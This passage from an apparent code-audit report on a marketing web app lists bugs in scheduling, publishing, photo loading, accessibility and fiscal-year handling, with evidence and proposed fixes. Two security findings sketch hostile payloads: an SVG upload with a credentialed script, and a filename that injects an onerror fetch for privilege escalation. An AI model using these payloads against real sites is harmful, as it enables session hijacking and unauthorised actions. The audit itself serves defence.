| [content-flow-7](#content-flow-7) | medium | minor | bug | ctLoadDrafts turns any failure into an empty board, which makes ctPublishDraft report a live post as 'Publish failed: HTTP 200' | `index.html:19208` | unverified |
| [content-flow-8](#content-flow-8) | medium | minor | bug | Out-of-order photo loads after a store switch show store A's photos under store B, and nothing stops them being saved or published to B's Page | `index.html:18647` | unverified |
| [content-flow-9](#content-flow-9) | medium | minor | bug | Flow Calendar: a newly added band gets id undefined, so it can't be edited or deleted until a full reload | `index.html:19645` | unverified |
| [content-flow-10](#content-flow-10) | medium | minor | bug | Generate cover overwrites the saved brand guide with '' when the initial load fails, and the Generate button has no in-flight guard | `index.html:18302` | unverified |
| [content-flow-11](#content-flow-11) | medium | minor | security | escapeHtml does not escape quotes; a thumbnail name with a double quote breaks out of alt="…" (confirmed in Chromium) | `index.html:18553` | unverified |
| [content-flow-12](#content-flow-12) | medium | minor | bug | Scheduler lease is stamped with the tick's START time and never renewed, so a post still publishing can be reaped and published a second time | `worker.js:15409` | unverified |
| [content-flow-15](#content-flow-15) | medium | minor | performance | Cover thumbnails are served full-size with a 1-hour cache and drawn into 40–78px tiles, so every visit re-downloads megabytes | `worker.js:17065` | unverified |
| [content-flow-16](#content-flow-16) | medium | minor | accessibility | Light-mode contrast failures on the pipeline: scheduled time 2.15:1, View/Posting 3.68:1, Publish button 3.68:1, Delete button 3.76:1 | `index.html:19255` | unverified |
| [content-flow-17](#content-flow-17) | medium | minor | ui-ux | Phone ergonomics: card actions are 16.5–20.5px tall and packed side by side; composer inputs are 12–14px, so iOS zooms on focus | `index.html:19263` | unverified |
| [content-flow-13](#content-flow-13) | medium | major | bug | The composer's AI caption never sees the selected bin photos, only the cover (the 2026-08-26 lesson, through a second channel) | `index.html:19189` | unverified |
| [content-flow-14](#content-flow-14) | medium | major | bug | Everything is hard-coded to F26, which ends 2026-12-26; after that the photo folders, the 'Now' week, promo captions and the Flow Calendar all degrade silently | `index.html:18656` | unverified |
| [content-flow-18](#content-flow-18) | low | minor | bug | Schedule times: DST-transition mornings are off by an hour, and the popover defaults to device time while labelled ET | `worker.js:15325` | unverified |
| [content-flow-19](#content-flow-19) | low | minor | performance | Polling: duplicate reload loops keep running on other pages, the Drafts lane flashes 'Loading…' every 15s, and flow weeks are fetched twice on entry | `index.html:19322` | unverified |
| [content-flow-20](#content-flow-20) | low | minor | bug | Photo picker and pipeline silently truncate (photos LIMIT 200 per store, never retired; drafts LIMIT 300 across every status) | `worker.js:17209` | unverified |
| [content-flow-21](#content-flow-21) | low | minor | accessibility | Accessibility gaps: unlabelled composer controls, picker tiles with no name or state, tabs with no roles, Flow modals with no dialog semantics or Escape, edit cells unreachable by keyboard | `index.html:4265` | unverified |
| [content-flow-23](#content-flow-23) | low | minor | ui-ux | Small UX traps: Delete on a Published card says 'Delete this draft?', AI generate overwrites typed text, Flow seed defaults to a past week, 'Retry' opens a scheduler | `index.html:19422` | unverified |
| [content-flow-22](#content-flow-22) | low | major | ui-ux | The live preview is an Instagram mock-up (fake handle, 2,200 IG limit, caption below a 150-char cut), not what the Facebook Page post will look like | `index.html:4334` | unverified |

<details><summary>Details: evidence, failure scenario, proposed fix</summary>

<a id="content-flow-1"></a>
#### content-flow-1 — photo/thumbnail endpoints serve the uploader-declared Content-Type (SVG) from the API origin with no nosniff/CSP: stored XSS from any signed-in user

*high · minor · security · confidence high · `worker.js:16997` · unverified*

**Evidence.** photo-upload accepts any declared image type: `const ct = file.type || "application/octet-stream"; if (!ct.startsWith("image/")) ...` (worker.js:16891-16892), stores it as `content_type`, and any signed-in user may upload for their own store. The in-scope GET echoes it back: `let obj = null, ctype = row.content_type || "image/jpeg"; ... h.set("Content-Type", ctype);` (16989-16997). There is no X-Content-Type-Options, no Content-Security-Policy and no Content-Disposition. `size=thumb` falls back to the original when no thumb was sent (`if (!obj) obj = await env.MEDIA.get(row.r2_key)`). The thumbnail endpoint does the same: `h.set("Content-Type", row.content_type || "image/png")` (17064), with thumbnail-upload's identical `startsWith("image/")` check (17017). The session cookie is `Domain=retjghub.com; SameSite=Lax` (14861), so a top-level navigation to api.retjghub.com carries it, and script in that document can make same-origin credentialed calls to every action.

**Failure scenario.** A manager POSTs `photo-upload` with a File of type image/svg+xml containing `<script>fetch('?action=...',{method:'POST',credentials:'include',...})</script>`, then sends Brian the link `https://api.retjghub.com/?action=photo&id=N` ("can you check this bin photo?"). Brian opens it, or long-presses a tile and chooses Open image in new tab. The SVG renders as a document on the API origin and the script runs with his admin/superuser session: change roles, publish drafts to Facebook, delete data. Inside the app's own <img> tags it is inert, which is why nobody would notice it.

**Proposed fix.** Worker only, backward-compatible. Add `const SAFE_IMG = /^image\/(jpeg|png|webp|gif|heic|heif|avif)$/i;`. In both the `photo` and `thumbnail` GET handlers: `if (SAFE_IMG.test(ctype)) h.set('Content-Type', ctype); else { h.set('Content-Type','application/octet-stream'); h.set('Content-Disposition','attachment'); }`, then always set `X-Content-Type-Options: nosniff` and `Content-Security-Policy: default-src 'none'; sandbox` (neither affects <img> rendering). In photo-upload and thumbnail-upload, return 400 when `!SAFE_IMG.test(ct)`. To verify, upload a benign SVG with no script through staging using the admin secret and check the response headers. Per CLAUDE.md rule 3, do not probe with a script payload.

<a id="content-flow-2"></a>
#### content-flow-2 — Staged posts (status 'approved') come back to Drafts with Publish/Edit: duplicate public post, or a reschedule marked Published without ever posting live

*high · minor · bug · confidence high · `index.html:19290` · unverified*

**Evidence.** The schedule popover offers staging (`Staged as unpublished — you publish it manually in Facebook.`, 18218). When it fires, publishDraft sets `status = published ? "published" : "approved"` (worker.js:15301) and logs `status 'staged'` with a post_id. The frontend never mentions 'approved': `const drafts = rows.filter(d => d.status !== 'published' && !SCHED[d.status]);` (19290), so it renders as an ordinary draft card with `ctPublishDraft` (Publish), Edit and Delete (19263-19265). I confirmed this in Chromium: the stubbed approved row showed in Drafts with the buttons Publish/Edit/Delete. The worker lets both follow-up actions through. publish-draft claims from `status IN ('draft','approved',...)` (17640) and posts again with `published: true`. draft-schedule only refuses published/publishing (17553), and on firing the reconcile step `alreadyPosted` matches `status IN ('published','staged')` (15375) and flips the row to 'published' without posting (15412-15415).

**Failure scenario.** Brian schedules a Coliseum post with Publish LIVE unchecked. At the scheduled time it is staged in Facebook Publishing Tools and the card jumps back to Drafts with no explanation. Either (a) he taps Publish, and a second, live copy is created while the staged one is still in Publishing Tools; if he already published the staged one there, as the popover told him to, followers see the post twice. Or (b) he taps Edit and then Schedule… for tonight with LIVE checked; at fire time the scheduler finds the staged log row, marks the card Published with a View ↗ link, and nothing ever goes live.

**Proposed fix.** Frontend guard (about 15 lines, closes both UI paths): in ctRenderPipeline, route `d.status === 'approved'` out of Drafts and into the Scheduled lane. Give ctPipelineCard a branch for it: `meta = 'Staged in Facebook — publish it from Publishing Tools · ' + store`, metaClass inkDim, actions = `View ↗` (post_url) plus `Delete record`, with no Publish, Edit or Schedule. Follow-up worker guards, backward-compatible and deployable in either order: publish-draft and draft-schedule return 409 for 'approved' (or check marketing_publish_log for a staged post_id). processScheduledPosts step 5 should count only 'published' log rows as done when `publish_live = 1`.

<a id="content-flow-3"></a>
#### content-flow-3 — Composer 'Schedule…' inserts a NEW draft on every attempt and has no in-flight guard: a cancelled or failed schedule leaves duplicates, and a double-tap stacks two popovers

*medium · minor · bug · confidence high · `index.html:18141` · unverified*

**Evidence.** `async function ctScheduleFromComposer() { ... try { id = await ctPersistDraft(); } ... const ok = await ctSchedule(id); if (ok) { ctResetComposer(); ...} }` (18141-18149). ctPersistDraft INSERTs whenever `ctEditingId` is null (`if (ctEditingId) body.id = ctEditingId;`, 18133) and never binds the new id back to the composer. When ctSchedule returns false (popover cancelled, or the worker says `Pick a time in the future`/`Invalid date/time`), the composer stays unbound. `#ct-schedule-btn` is never disabled, while `ctSaveDraft` does disable its own button.

**Failure scenario.** 1) Brian composes a post, taps Schedule…, decides to change the caption and presses Cancel. Draft #41 now exists. He edits and taps Schedule… again, which creates #42 and schedules it. #41 sits in Drafts with the old caption and the same photos; later someone taps Publish on it and the store page gets the same bin photos twice. 2) On a slow connection he double-taps Schedule…. Two drafts are inserted and two identical popovers stack. He confirms the top one, sees the same dialog still there, and confirms again: two live posts are scheduled for the same slot.

**Proposed fix.** In ctScheduleFromComposer: `const btn = el('ct-schedule-btn'); if (btn.disabled) return; btn.disabled = true; el('ct-save-draft').disabled = true; try { ...persist...; ctEditingId = id; el('ct-save-draft').textContent = 'Update draft'; el('ct-clear').classList.remove('hidden'); ctSaveLocal(); const ok = await ctSchedule(id); ... } finally { btn.disabled = false; el('ct-save-draft').disabled = false; }`. Later saves and schedule retries then update the same row. Optionally, in the popover's OK handler, compare `when` against `localNow(new Date())` and show an inline error so the round trip that fails is avoided.

<a id="content-flow-4"></a>
#### content-flow-4 — Publish on a draft card posts the SAVED copy while the composer holds unsaved edits to the same post, and the confirm names neither the store nor the caption

*medium · minor · bug · confidence high · `index.html:19431` · unverified*

**Evidence.** `const ok = await uiConfirm('Post this to Facebook? The cover and photos will be published LIVE to the store’s Page with your caption.', ...)` (19431), then `publish-draft { draft_id: id, published: true }` (19446). The worker publishes whatever D1 holds (publishDraft reads `SELECT * FROM marketing_drafts WHERE id = ?`, worker.js:15237). ctPublishDraft never checks `ctEditingId === id && ctDirty`. The pipeline is only visible on the Posts tab (`pipeline.classList.toggle('hidden', tab !== 'posts')`, 18098), so the edited composer is out of sight when Publish is pressed. The confirm says "with your caption" even when the saved caption is empty (auto-drafts whose AI caption failed store NULL).

**Failure scenario.** Brian clicks Edit on the BL4 draft, fixes a wrong price in the caption (the live preview shows the fix), switches to Posts and taps Publish. The ORIGINAL caption with the wrong price goes live on the Dupont page, and the composer still shows his corrected text. With six stores' drafts in one list, the generic confirm also gives him no chance to notice he tapped the wrong store's card.

**Proposed fix.** At the top of ctPublishDraft: `const d0 = (ctAllDrafts||[]).find(d => d.id === id) || {}; if (ctEditingId === id && ctDirty) { if (!(await uiConfirm('This post has unsaved edits in the composer. Save them and publish?', { okText: 'Save & publish' }))) return; try { await ctPersistDraft(); ctDirty = false; } catch (e) { return uiAlert(e.message, { title: 'Couldn’t save' }); } }`. Build the confirm text from d0: store label, image count, and the first 120 characters of the caption, or "(no caption — photos only)".

<a id="content-flow-5"></a>
#### content-flow-5 — 'Update draft' on a post that has since been published silently rewrites the published record (a restored autosave or a long edit session)

*medium · minor · bug · confidence high · `worker.js:17266` · unverified*

**Evidence.** draft-save refuses only one state: `if (cur && cur.status === "publishing") return ... 409` (17266). It then runs `UPDATE marketing_drafts SET store=?, thumbnail_id=?, photo_ids=?, caption=? ... WHERE id=?` for any other status, published included. On the frontend, `ctRehydrateFrom` restores `ctEditingId = s.editing || null` from localStorage (18497) without checking that the draft still exists or is still editable. ctEditDraft lets a scheduled post be edited for as long as the user likes while the cron can publish it underneath.

**Failure scenario.** Brian opens a scheduled post in the composer, gets interrupted, and the app is closed; the autosave keeps `editing: 57`. The cron publishes #57 at 9:00. That afternoon he reopens Content, the composer rehydrates his half-edit and he taps Update draft. The worker overwrites the published row's caption and photos, shows "✓ Draft saved.", and the Published archive plus buildCaption's do-not-repeat list now hold text that never went to Facebook. Tapping Schedule… instead rewrites the record first and only then gets 409 from draft-schedule.

**Proposed fix.** Worker guard, self-contained and backward-compatible: `if (cur && ['publishing','published','approved'].includes(cur.status)) return 409 { error: 'This post has already gone to Facebook — save it as a new draft instead' }`. Frontend: after `ctLoadDrafts()` in initContent, if `ctEditingId` is not in ctAllDrafts with status draft/scheduled/schedule_error, clear it (the composer becomes a new draft) and show a status line saying the original was published.

<a id="content-flow-6"></a>
#### content-flow-6 — Composer work is silently lost: a notification deep-link wipes the autosave, Edit replaces unsaved work, and AI captions are never autosaved

*medium · minor · bug · confidence high · `index.html:18447` · unverified*

**Evidence.** initContent: `const saved = ctReadLocal(); ctResetComposer(); // baseline (also clears storage)` then `if (window.__ctDeepLink) { // ... skip the default load. } else if (saved && ...) { await ctRehydrateFrom(saved); }` (18446-18451). ctResetComposer calls `ctClearLocal()` (18945), and the deep-link branch never restores or re-saves `saved`. ctEditDraft overwrites the composer state with no dirty check and never calls ctSaveLocal (19393-19418). ctAiCaption sets `el('ct-caption').value = d.caption` and `ctCaptionSource = 'ai'` but never calls ctMarkDirty/ctSaveLocal (19192-19196), so the autosave and the PWA reload guard (`window.ctIsDirty`, 34778) don't cover it.

**Failure scenario.** Brian is halfway through a caption, the draft autosaved, and he closes the app. Later he taps the "BL4 submitted 14 photos" push, which is exactly how he is meant to start composing. The first Content init runs down the deep-link branch and the autosave is erased for good. In another case he taps Edit on a draft card while composing something else, and the unsaved caption is replaced with no prompt. In a third, he opens a draft with Edit and generates an AI caption; a service-worker update lands (ctDirty is false), the page reloads, and an older autosave comes back instead of his AI text.

**Proposed fix.** initContent: move `ctResetComposer()` into the non-deep-link branches, or in the deep-link branch `if (saved && (...)) await ctRehydrateFrom(saved);` before ctDeepLinkToFolder; in ctDeepLinkToFolder, skip the store switch (or ask) when the composer is dirty for another store. ctEditDraft: `if (ctDirty && ctEditingId !== id && !(await uiConfirm('Discard the post you are composing?', { danger: true, okText: 'Discard' }))) return;` and call `ctSaveLocal()` at the end. ctAiCaption: call `ctMarkDirty()` after writing the caption.

<a id="content-flow-7"></a>
#### content-flow-7 — ctLoadDrafts turns any failure into an empty board, which makes ctPublishDraft report a live post as 'Publish failed: HTTP 200'

*medium · minor · bug · confidence high · `index.html:19208` · unverified*

**Evidence.** `const r = await fetch(...drafts&status=all...); const d = await r.json(); ctAllDrafts = (d && d.drafts) || []; } catch (_) { ctAllDrafts = []; }` (19206-19210). There is no r.ok check, and the lanes then render 'No drafts yet.' / 'Nothing scheduled yet.' / 'Nothing published yet.'. ctPublishDraft trusts that reload over the publish response: `await ctLoadDrafts(); const cur = (ctAllDrafts || []).find(d => d.id === id) || {};` then falls through to `uiAlert(`Couldn’t publish: ${j.error || ('HTTP ' + (resp ? resp.status : '?'))}...`, { title: 'Publish failed' })` (19454-19475). Running the sliced functions in node with publish-draft → `{ok:true}` and the drafts fetch rejecting printed exactly `Publish failed: Couldn’t publish: HTTP 200`. DESIGN.md §6 specifies "Fetch failed → Couldn't load + Retry" for this case.

**Failure scenario.** On a flaky phone connection Brian publishes a Holland post. The post goes live, but the board reload fails. He sees "Publish failed: Couldn’t publish: HTTP 200" above a board that says "No drafts yet". Believing it failed, he posts the photos by hand in Facebook, and followers see a duplicate. The same empty-board state appears whenever the session expires (403 JSON), which reads as "all my drafts are gone".

**Proposed fix.** ctPublishDraft: check the direct response first. `if (resp && resp.httpOk && resp.j && resp.j.ok) { await uiAlert((resp.j.published ? 'Posted to ' : 'Staged for ') + ctStoreLabel(store) + ' ✓' + (resp.j.post_url ? '\n\n' + resp.j.post_url : ''), { title: 'Published' }); ctLoadDrafts(); return; }`. ctLoadDrafts: add a sequence token, throw on `!r.ok || !d.ok`, keep the previous ctAllDrafts on failure and render "Couldn't load posts · Retry" in the lanes; return a boolean so callers can tell a failed reconcile from real data.

<a id="content-flow-8"></a>
#### content-flow-8 — Out-of-order photo loads after a store switch show store A's photos under store B, and nothing stops them being saved or published to B's Page

*medium · minor · bug · confidence high · `index.html:18647` · unverified*

**Evidence.** `ctOnStoreChange() { ... ctLoadPhotos().then(() => ctRenderPreview()); }` (18360). ctLoadPhotos reads the store, awaits `fetch(...marketing-photos&store=${store}...)`, then unconditionally sets `ctPhotos = (d && d.photos) || []` (18642-18647) with no sequence token. draft-save accepts any photo ids (`photoIds = b.photo_ids.map(...)`, worker.js:17257) and publishDraft loads them by id alone (15258). Running ctLoadPhotos in node with the BL1 response delayed until after BL4's printed `select shows BL4 | picker holds photos of store [ 'BL1' ]`. ctEditDraft has the same problem: two quick Edit clicks interleave around `await ctLoadPhotos()` and can leave `ctEditingId = Y` holding X's caption and photos.

**Failure scenario.** On desktop Brian arrows through the Store select (Coliseum → South Bend). The Coliseum response lands last, so the picker shows Coliseum's bins while the select and preview say South Bend. He taps Select all, writes the caption and schedules. South Bend's Facebook page then posts Coliseum's bin photos.

**Proposed fix.** `let ctPhotoSeq = 0;` In ctLoadPhotos: `const seq = ++ctPhotoSeq; ... after the awaits: if (seq !== ctPhotoSeq) return;`. Use the same token pattern in ctEditDraft. In ctPersistDraft, drop (and warn about) any selected id whose ctPhotos row has `store !== body.store`. Add a worker-side safety later: in draft-save, filter photo_ids with `SELECT id FROM marketing_photos WHERE store = ? AND id IN (...)`.

<a id="content-flow-9"></a>
#### content-flow-9 — Flow Calendar: a newly added band gets id undefined, so it can't be edited or deleted until a full reload

*medium · minor · bug · confidence high · `index.html:19645` · unverified*

**Evidence.** The body is built with `id: fcEditSeg ? fcEditSeg.id : undefined` (19633), and after the save `else fcSegments.push(Object.assign({ id: data.id }, body));` (19645). Object.assign copies own properties even when they are undefined, so body.id overwrites data.id. Node run: `pushed segment id = undefined`, render `data-fcseg="undefined"`, `+td.dataset.fcseg` is NaN, and `fcSegments.find(...)` returns undefined, so fcEditSegment silently does nothing. `initFlowCalendar` never refetches (`if (fcBooted) return;`), so leaving and re-entering the page doesn't fix it. fcSaveWeek and fcSaveSeg also read `fcEditWk`/`fcEditSeg` AFTER the await (19578, 19644): if the modal is closed during the save, the saved week isn't reflected, and if another week is opened, the old week's row is written into the new week's slot.

**Failure scenario.** An admin adds a 'Leadership Training' band for W41–W42, sees it appear, notices the wrong end week and clicks it in edit mode. Nothing opens. Delete is unreachable too. Navigating away and back doesn't help; only a full app reload does.

**Proposed fix.** `fcSegments.push(Object.assign({}, body, { id: data.id }));`. In fcSaveWeek, capture `const wk = fcEditWk;` before the await and use it for the findIndex. In fcSaveSeg, capture `const seg = fcEditSeg;` and use it after the await.

<a id="content-flow-10"></a>
#### content-flow-10 — Generate cover overwrites the saved brand guide with '' when the initial load fails, and the Generate button has no in-flight guard

*medium · minor · bug · confidence high · `index.html:18302` · unverified*

**Evidence.** `try { const r = await fetch(...content-setting&key=brand_guide...); const d = await r.json(); brand = (d && d.value) || ''; } catch (_) {}` (18294-18297). There is no r.ok check, so a network error or 403 leaves `brand = ''` and the modal opens with an empty textarea (its grey placeholder looks like content). After Generate it always writes back: `await fetch(...content-setting, { method: 'POST', ... body: JSON.stringify({ key: 'brand_guide', value: picked.brand }) })` (18302). The worker stores it: `INSERT ... ON CONFLICT(key) DO UPDATE SET value=excluded.value` (worker.js:17122). The pane's `✨ Generate` button (4351) stays enabled through the 20–40 s paid generation.

**Failure scenario.** On a weak connection the brand-guide GET fails. Brian types "Friday bin preview" and hits Generate. The POST succeeds and replaces the multi-paragraph brand guide (colours, fonts, tone) with an empty string, so every later AI cover is off-brand with no hint why. Separately, a second tap on Generate during the wait starts a second paid generation.

**Proposed fix.** `let brand = '', loaded = false; try { const r = await fetch(...); const d = await r.json(); if (r.ok && d && d.ok) { brand = d.value || ''; loaded = true; } } catch (_) {}` and persist only `if (loaded && picked.brand !== brand)`. If the load failed, show "Couldn't load your saved brand guide — it won't be changed" in the modal. Give the Generate button an id and disable it until the request settles.

<a id="content-flow-11"></a>
#### content-flow-11 — escapeHtml does not escape quotes; a thumbnail name with a double quote breaks out of alt="…" (confirmed in Chromium)

*medium · minor · security · confidence high · `index.html:18553` · unverified*

**Evidence.** `function escapeHtml(str) { const div = document.createElement("div"); div.appendChild(document.createTextNode(String(str))); return div.innerHTML; }` (7753-7757). Text-node serialisation escapes only & < > and nbsp. It is used inside an attribute here: `<img src="...thumbnail&id=${t.id}" ... alt="${escapeHtml(t.name || '')}" loading="lazy">` (18553). Names come from the upload filename or the first 60 characters of the AI prompt (`String(b.name || userPrompt).trim().slice(0, 60)`, worker.js:17184). In Chromium, the name `Cover "$10 FRIDAY"` produced the attributes `alt=Cover`, `$10=`, `friday""=`, and a name `x" onerror="...` produced a live `onerror` attribute. The site sends no CSP (_headers sets only Cache-Control).

**Failure scenario.** The ordinary case: Brian generates a cover from the prompt `"$10 FRIDAY" bin preview`, and its alt text is mangled into junk attributes. The hostile case: an admin uploads `promo" onerror="fetch('https://api.retjghub.com/?action=...',{credentials:'include',...})".png`. When a superuser opens the Thumbnails tab, script runs in the app origin with the superuser session, and the worker has superuser-only actions (e.g. 23410/23478), so an admin can escalate to superuser.

**Proposed fix.** One line, safe app-wide: `return div.innerHTML.replace(/"/g, '&quot;').replace(/'/g, '&#39;');`. The entities render identically in text and in attributes, so every existing caller keeps working, and attribute uses elsewhere in the file are fixed at the same time.

<a id="content-flow-12"></a>
#### content-flow-12 — Scheduler lease is stamped with the tick's START time and never renewed, so a post still publishing can be reaped and published a second time

*medium · minor · bug · confidence medium · `worker.js:15409` · unverified*

**Evidence.** `const nowMs = now.getTime(), nowIso = now.toISOString();` is computed once per tick (15370), and every claim in that tick's sequential loop uses it: `UPDATE marketing_drafts SET status='publishing', claimed_at=? ... WHERE id=? AND status='scheduled'` `.bind(nowIso, row.id)` (15407-15409), up to PER_TICK=5 multi-photo posts in a row. The every-minute cron runs overlapping invocations, and each one's reaper requeues any `status='publishing' AND claimed_at < now-5min` row that has no log yet: `SET status='scheduled', claimed_at=NULL, next_attempt_at=+2min` (15390). The original publisher's final `UPDATE ... SET status=? WHERE id=?` is unconditional (15301), and the new claimant's reconcile runs before the first publisher has logged anything. Manual publish-draft rows are also reaped into 'scheduled' even when `scheduled_at IS NULL`; the due query requires `scheduled_at IS NOT NULL` (15397), so they never fire and the card reads just "Scheduled" (`ctFmtSchedTime(null)`).

**Failure scenario.** Friday 9:00, six stores are due, each with about 40 photos and 2–3 minute uploads. A tick claims a row two or three minutes into its loop but stamps it 9:00. While it is still uploading, a concurrent tick's reaper treats it as stale and requeues it; two minutes later another tick claims it, finds no log row, and publishes again. The store page gets the post twice. In the manual case, a publish interrupted by a client disconnect sits in Scheduled with no time forever, and unscheduling and re-publishing may duplicate a post that actually went out.

**Proposed fix.** Minor: stamp at claim time with `.bind(new Date().toISOString(), row.id)`. In the reaper, send rows with `scheduled_at IS NULL` back to 'draft' (with schedule_error 'Interrupted — check Facebook before retrying') instead of 'scheduled'. Frontend: when a scheduled card has `!dr.scheduled_at`, show "Interrupted — check Facebook". Major follow-up: renew the lease during publishDraft (UPDATE claimed_at after each photo upload), size CLAIM_STALE_MS from the photo count, and make the final status UPDATE conditional on `status='publishing' AND claimed_at=?`. Worker-only; to verify, replay a tick against a local D1 with a stubbed Graph fetch that sleeps.

<a id="content-flow-15"></a>
#### content-flow-15 — Cover thumbnails are served full-size with a 1-hour cache and drawn into 40–78px tiles, so every visit re-downloads megabytes

*medium · minor · performance · confidence medium · `worker.js:17065` · unverified*

**Evidence.** `h.set("Cache-Control", "private, max-age=3600");` (17065), compared with photos' `private, max-age=2592000, immutable` (16999). Covers have no derivative (uploads up to 15MB, 17020; generated covers are full-resolution PNGs). The same full image is used by the 78px picker (`<img src="...thumbnail&id=${t.id}" class="w-full h-full object-cover" ...>`, 18568), the 40px pipeline cards (19222), the grid and the preview. Rows are insert-only (soft delete flips `active` only), so an id's bytes never change.

**Failure scenario.** With 20 covers of about 1.5MB each, opening Content on a phone after an hour away pulls about 30MB again just for the picker row, plus a full decode per tile. The composer is slow and costly on cellular data exactly when a manager's photo push brings Brian in.

**Proposed fix.** Minor, worker-only: `h.set('Cache-Control', 'private, max-age=2592000, immutable')` for thumbnails, safe because ids are never rewritten, and add `decoding="async"` to the picker and card <img>. Major follow-up: store a 320px JPEG derivative at thumbnail-upload/generate time (as photo-upload does with `thumb`), serve it on `&size=thumb`, backfill existing covers, and point the picker, cards and grid at `size=thumb`. Worker first; the frontend param is ignored by an old worker.

<a id="content-flow-16"></a>
#### content-flow-16 — Light-mode contrast failures on the pipeline: scheduled time 2.15:1, View/Posting 3.68:1, Publish button 3.68:1, Delete button 3.76:1

*medium · minor · accessibility · confidence high · `index.html:19255` · unverified*

**Evidence.** `metaClass = 'text-accent-amber';` for the scheduled-time line (19255): #f59e0b on #ffffff = 2.15:1, while dark = 8.28 (passes). `text-accent-blue` for `View ↗` (19229) and the Posting… meta (19246): #3b82f6 on white = 3.68:1 (dark 4.84, OLED 5.38). `text-white bg-accent-blue` Publish (19263): 3.68:1 in both themes. `text-white bg-op-bad` Delete in the delete bar (18850): 3.76:1 in both themes. The first <style> block overrides light-mode `.text-accent-green`, `.text-op-bad` and `.text-op-warn` but not amber or blue. All text is 11–12px. Computed from tailwind.config.js hexes against opl-panel #ffffff and op-panel #101826, not from a screenshot.

**Failure scenario.** In light mode, the one piece of information on a Scheduled card, when it will go public, is pale amber on white and effectively unreadable outdoors on a phone. The primary Publish button fails AA in both themes.

**Proposed fix.** Following the file's existing technique, add `html:not(.dark) .text-accent-amber { color: #92400e; }` (7.09 on white, 6.78 on panelHi) and `html:not(.dark) .text-accent-blue { color: #1d4ed8; }` (6.70). Change the Publish button to `bg-[#1d4ed8]` (white 6.70) and the Delete button to `bg-[#b91c1c]` (white 6.47). Re-measure in light, dark and OLED.

<a id="content-flow-17"></a>
#### content-flow-17 — Phone ergonomics: card actions are 16.5–20.5px tall and packed side by side; composer inputs are 12–14px, so iOS zooms on focus

*medium · minor · ui-ux · confidence high · `index.html:19263` · unverified*

**Evidence.** Measured in Chromium at 393px: Publish 20.5px tall, Edit 16.5px, Delete 16.5px, Unschedule 16.5px (`text-[11px] ... px-1` with no vertical padding, 19263-19265, 19256-19257), with Publish, Edit and Delete adjacent in one row. Computed font-size: #ct-store 14px, #ct-topic 14px, #ct-caption 14px, #ct-store-filter 12px (also `text-sm` on #cts-when, #ctg-*, #fw-*, #fs-*). DESIGN.md §9 keeps tap targets ≥40px and §3.2 notes a 16px input "or iOS zooms on focus".

**Failure scenario.** Brian taps Edit on a Drafts card with his thumb and hits Publish, which sits right next to it. The confirm catches it, but the reverse slip (meaning Delete, hitting Edit) happens often. Every tap into the caption box on iPhone zooms the PWA and leaves it zoomed after blur, so he has to pinch back out to reach Save draft.

**Proposed fix.** Card actions: `min-h-[36px] px-2.5 rounded-md` with `gap-1.5` between them, and move Delete into a trailing position separated from the outward action (or behind a ⋯ menu). Inputs: use `text-base sm:text-sm` on #ct-store, #ct-topic, #ct-caption, #cts-when, the ctg textareas and the fw-/fs- modal inputs, and `text-base sm:text-xs` on the two xs selects.

<a id="content-flow-13"></a>
#### content-flow-13 — The composer's AI caption never sees the selected bin photos, only the cover (the 2026-08-26 lesson, through a second channel)

*medium · major · bug · confidence high · `index.html:19189` · unverified*

**Evidence.** The frontend sends `JSON.stringify({ store, topic, thumbnail_id: ctSelThumb, post_type: ctPostType })` (19189) with no photo ids, and the endpoint forwards `buildCaption(env, { store, fiscalYear, topic, postType, thumbnailId })` without them either (worker.js:17520-17523). buildCaption then loads the cover because no photos were named (`if (env.DB && !photoIds.length && Number.isInteger(thumbId))`, 7428) and tells the model to `Match the caption to what it actually promotes` (7470). tasks/lessons.md (2026-08-26): "The model's subject is whatever it can SEE ... When you gate a context source, enumerate every channel that carries it." The auto-draft was fixed to pass photoIds (8045-8048); the composer was not.

**Failure scenario.** Brian builds a Bin Preview post in the composer with the Dollar Days cover plus 12 bin photos and taps ✨ AI generate. The caption opens on the cover's $10 → 50¢ price ladder and says nothing about what is in the bins, which is the exact complaint behind the lesson. With no cover selected, the model sees no image at all and writes a generic caption.

**Plan.** Plan, safe in either deploy order. (1) Worker first: in draft-generate-caption, also pass `photoIds: Array.isArray(b.photo_ids) ? b.photo_ids : []`. An old frontend sends nothing and behaves exactly as today. (2) Frontend: add `photo_ids: [...ctSelPhotos]` to the body. The frontend change is inert against an old worker. Verify with test-bin-photo-autodraft-style stubs asserting that the Claude request's content carries photo blocks and no cover block when photos are selected. Risk: CAPTION_PHOTO_LIMIT already caps the images and cost.

<a id="content-flow-14"></a>
#### content-flow-14 — Everything is hard-coded to F26, which ends 2026-12-26; after that the photo folders, the 'Now' week, promo captions and the Flow Calendar all degrade silently

*medium · major · bug · confidence high · `index.html:18656` · unverified*

**Evidence.** `fetch(`${WORKER_BASE}?action=flow-calendar&fy=F26`...)` in ctEnsureFlowWeeks (18656) and ctFlowSeed (18232); `body: JSON.stringify({ fiscal_year: 'F26', ... })` (18240); initFlowCalendar sends no fy and the worker defaults with `const fy = url.searchParams.get("fy") || "F26"` (worker.js:17675); buildCaption has `const fy = String(opts.fiscalYear || "F26")` (7398). The seed data covers W14 2026-03-29 to W52 2026-12-20..2026-12-26 (migration-016.sql). fcRenderMatrix hard-codes three `colspan="13"` quarter headers (17788-17791).

**Failure scenario.** From 2026-12-27, ctPhotoWeekOf returns null for every new photo and post, so the Bin photos picker becomes one 'Undated' folder, the 'Now' folder disappears and the Published archive goes Undated. weekly_promo/event captions lose the week's plan with no error. The Flow Calendar still shows F26 with no current week, and 'This week' silently does nothing (fcNowIdx = -1).

**Plan.** Plan. (1) Data: add F27 marketing_flow and flow_segments rows (a migration, applied to staging then prod, with explicit confirmation per CLAUDE.md rule 7). (2) Worker: when `fy` is absent, resolve the fiscal year whose week range covers today; have flow-calendar return the list of available fiscal years; buildCaption resolves the week by date across all fiscal years. This is backward-compatible, so the worker deploys first. (3) Frontend: drop the literal 'F26', take fiscalYear from the response, add a fiscal-year switcher to the Flow Calendar header, derive the quarter headers from the week numbers, and have ctFlowSeed send the fy it loaded. (4) Verify by stubbing today as 2026-12-28 in node and checking folder keys and fcNowIdx. Risk: photo/published foldering spans two fiscal years, so ctFlowWeeks must hold both.

<a id="content-flow-18"></a>
#### content-flow-18 — Schedule times: DST-transition mornings are off by an hour, and the popover defaults to device time while labelled ET

*low · minor · bug · confidence high · `worker.js:15325` · unverified*

